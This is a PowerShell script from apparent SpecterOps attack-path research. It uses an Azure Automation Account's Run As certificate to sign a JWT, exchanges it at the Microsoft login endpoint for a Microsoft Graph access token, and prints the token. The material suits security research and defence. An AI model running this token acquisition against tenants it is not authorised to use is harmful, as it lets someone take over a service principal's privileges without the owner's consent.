# Script by Andy Robbins (@_wald0)
# Source: https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a
# This script can be used to get a JWT for a Service Principal where the Automation Account authenticates in a "Run As" scenario, using certificate authentication.
# In the last part, the script takes the JWT to the OAuth token acquisition endpoint, specifying MS Graph as the scope

$connectionName = "AzureRunAsConnection"
$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName
$TenantId = $servicePrincipalConnection.TenantId
$ClientId = $servicePrincipalConnection.ApplicationId
$CertificateThumbprint = $servicePrincipalConnection.CertificateThumbprint
function GenerateJWT (){
    $thumbprint = $CertificateThumbprint
    $cert = Get-Item Cert:\CurrentUser\My\$Thumbprint
    $hash = $cert.GetCertHash()
    $hashValue = [System.Convert]::ToBase64String($hash) -replace '\+','-' -replace '/','_' -replace '='
    $exp = ([DateTimeOffset](Get-Date).AddHours(1).ToUniversalTime()).ToUnixTimeSeconds()
    $nbf = ([DateTimeOffset](Get-Date).ToUniversalTime()).ToUnixTimeSeconds()
    $jti = New-Guid
    [hashtable]$header = @{alg = "RS256"; typ = "JWT"; x5t=$hashValue}
    [hashtable]$payload = @{aud = "https://login.microsoftonline.com/$TenantId/oauth2/token"; iss = "$ClientId"; sub="$ClientId"; jti = "$jti"; exp = $Exp; Nbf= $Nbf}
    $headerjson = $header | ConvertTo-Json -Compress
    $payloadjson = $payload | ConvertTo-Json -Compress
    $headerjsonbase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($headerjson)).Split('=')[0].Replace('+', '-').Replace('/', '_')
    $payloadjsonbase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payloadjson)).Split('=')[0].Replace('+', '-').Replace('/', '_')
    $toSign = [System.Text.Encoding]::UTF8.GetBytes($headerjsonbase64 + "." + $payloadjsonbase64)
    $rsa = $cert.PrivateKey -as [System.Security.Cryptography.RSACryptoServiceProvider]
    $signature = [Convert]::ToBase64String($rsa.SignData($toSign,[Security.Cryptography.HashAlgorithmName]::SHA256,[Security.Cryptography.RSASignaturePadding]::Pkcs1)) -replace '\+','-' -replace '/','_' -replace '='
    $token = "$headerjsonbase64.$payloadjsonbase64.$signature"
    return $token
}
$reqToken = GenerateJWT
$Body = @{
    scope = "https://graph.microsoft.com/.default"
    client_id = $ClientId
    client_assertion_type = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
    client_assertion = $reqToken
    grant_type = "client_credentials" `
}
$MGToken = Invoke-RestMethod `
    -URI "https://login.microsoftonline.com/$($TenantId)/oauth2/v2.0/token" `
    -Body $Body `
    -Method POST
$MGToken.access_token
